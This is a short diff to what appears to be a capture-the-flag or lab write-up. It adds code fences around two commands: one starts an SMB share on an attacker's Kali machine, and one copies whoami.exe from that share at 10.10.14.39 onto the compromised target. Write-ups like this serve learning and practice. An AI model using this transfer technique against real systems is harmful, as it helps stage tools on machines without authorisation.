@@ -92,6 +92,12 @@ To solve it, I transferred the 'whoami' command from my Kali Linux to the target
 the 'whoami.exe' binary in Kali is located in this directory: /usr/share/windows-resources/binaries/
 \
 In order to transfer this binary, I created a smb share:\
+```bash
 smbserver.py a /usr/share/windows-resources/binaries/ 
+```
 \
-And downloaded the file in the target machine: copy '\\\10.10.14.39\a\whoami.exe'
+And downloaded the file in the target machine:
+\
+```bash
+copy '\\\10.10.14.39\a\whoami.exe'
+```
